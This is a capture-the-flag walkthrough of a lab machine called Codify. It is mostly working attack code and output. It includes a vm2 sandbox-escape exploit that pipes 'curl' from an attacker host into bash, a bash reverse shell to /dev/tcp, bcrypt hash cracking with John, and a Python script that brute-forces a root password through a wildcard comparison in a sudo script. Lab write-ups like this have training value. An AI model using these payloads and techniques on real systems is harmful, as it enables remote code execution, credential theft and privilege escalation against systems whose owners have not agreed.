# Reconnaissances
## Port Scanning
`$ sudo nmap -Pn -sC -sV 10.10.11.239`
```
Nmap scan report for 10.10.11.239
Host is up (0.021s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.72 seconds
```

### Observe the HTTP
`$ echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts`
`$ firefox codify.htb`
```
The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
```
Refer to: https://github.com/patriksimek/vm2/releases/tag/3.9.16

# Pre-Exploitation
Refer to: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

Proof of Concept:
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```

# Exploit
Create `index.html` that contains:
```
#! /bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1'
```
Then listening on HTTP port 80
`$ python3 -m http.server 80`

Also create the listening port 9001
`$ rlwrap nc -lnvp 9001`

Then run the script below in http://codify.htb/editor
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.14.21/ | bash');
}
`

console.log(vm.run(code));
```

## Got Shell
```
listening on [any] 9001 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.239] 55468
bash: cannot set terminal process group (1253): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ cat /var/www/contact/tickets.db
cat /var/www/contact/tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�� tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!opensvc@codify:~$ 
```

Try to crack the password of Joshua
`$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:51 0.00% (ETA: 2024-03-27 19:28) 0g/s 11.45p/s 11.45c/s 11.45C/s rodrigo..tennis
spongebob1       (?)     
1g 0:00:02:10 DONE (2024-03-10 11:36) 0.007659g/s 10.34p/s 10.34c/s 10.34C/s crazy1..eunice
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## SSH Connect
`$ ssh joshua@10.10.11.239`
```
The authenticity of host '10.10.11.239 (10.10.11.239)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.239' (ED25519) to the list of known hosts.
joshua@10.10.11.239's password: spongebob1
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 10 03:36:03 PM UTC 2024

```
```
joshua@codify:~$ cat user.txt 
47178887cdb29dc73170d4ebf12ce66e
```

# Privilege Escalation
`joshua@codify:~$ sudo -l`
```
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ 
```

`joshua@codify:~$ cat /opt/scripts/mysql-backup.sh `
```
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
joshua@codify:~$ /opt/scripts/mysql-backup.sh
/usr/bin/cat: /root/.creds: Permission denied
Enter MySQL password for root: spongebob1
Password confirmation failed!
joshua@codify:~$ /opt/scripts/mysql-backup.sh
/usr/bin/cat: /root/.creds: Permission denied
Enter MySQL password for root: *
Password confirmed!
Enter password: *
ERROR 1045 (28000): Access denied for user 'root'@'172.19.0.1' (using password: YES)
All databases backed up successfully!
Changing the permissions
/usr/bin/chown: changing ownership of '/var/backups/mysql': Operation not permitted
/usr/bin/chmod: changing permissions of '/var/backups/mysql': Operation not permitted
/usr/bin/chmod: cannot access '/var/backups/mysql/mysql.sql.gz': Permission denied
/usr/bin/chmod: cannot access '/var/backups/mysql/sys.sql.gz': Permission denied
Done!
joshua@codify:~$ 
```

I got this python script to bruteforce the password from internet
```
import string  
import subprocess  
all = list(string.ascii_letters + string.digits)  
password = ""  
found = False  
  
while not found:  
for character in all:  
command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"  
output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout  
  
if "Password confirmed!" in output:  
password += character  
print(password)  
break  
else:  
found = True
```

Then run it:
`joshua@codify:/tmp$ python3 codify.py`
```
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```
**Password**: kljh12k3jhaskjh12kjh3

## Got Root
`joshua@codify:/tmp$ su`
```
Password: kljh12k3jhaskjh12kjh3
root@codify:/tmp# cat /root/root.txt
0005566786163b42ee31c7d98e053653
root@codify:/tmp# 
```